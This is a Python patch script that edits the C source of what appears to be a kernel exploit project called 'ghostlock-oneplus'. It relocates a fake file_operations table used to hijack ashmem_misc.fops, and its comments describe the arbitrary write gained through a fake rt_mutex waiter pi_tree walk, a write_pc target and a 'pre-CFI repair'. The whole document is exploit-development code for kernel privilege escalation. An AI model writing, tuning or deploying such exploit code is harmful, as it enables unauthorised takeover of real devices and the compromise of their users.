import os
U="/root/ghostlock/ghostlock-oneplus/src/core/util.c"
s=open(U).read()
assert "FOPS_AT_WRITE" not in s

# marker comment
s=s.replace(
 "  fake_fops = payload_base + FOPS_TABLE_OFF;",
 "  /* FOPS_AT_WRITE: the chain[11] walk empirically writes (page+0x319) =\n"
 "   * (fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF)|1 into *(ashmem_misc.fops),\n"
 "   * NOT write_pc.  Put the real fops table exactly there (built by the\n"
 "   * pre-CFI repair, after the walk has rearranged W0's pi_tree). */\n"
 "  fake_fops = payload_base + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 1;",
 1)

# mode-4 write_pc = dummy page+0x100
old="""      const char *wpt = getenv("WRITE_PC_TEST");
      write_pc = (wpt && *wpt) ? strtoull(wpt, NULL, 0) : fake_fops;"""
new="""      const char *wpt = getenv("WRITE_PC_TEST");
      write_pc = (wpt && *wpt) ? strtoull(wpt, NULL, 0)
                               : payload_base + FOPS_TABLE_OFF;  /* dummy node */"""
assert s.count(old)==1, ("write_pc", s.count(old))
s=s.replace(old,new,1)

# binwrite_target out of the table region
old2="""    binwrite_target = payload_base + SCRATCH_OFF;
  } else {"""
new2="""    binwrite_target = payload_base + 0x800;   /* outside the 0x319 fops table */
  } else {"""
assert s.count(old2)==1, ("binwrite_target", s.count(old2))
s=s.replace(old2,new2,1)

# repair poff
old3="  size_t poff = (size_t)(FOPS_TABLE_OFF - LOCK_OFF);   /* fake_fops page off */"
new3="  size_t poff = (size_t)((W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 1) - LOCK_OFF); /* fake_fops page off */"
assert s.count(old3)==1, ("poff", s.count(old3))
s=s.replace(old3,new3,1)

open(U,"w").write(s)
print("util.c: fops table relocated to 0x319")
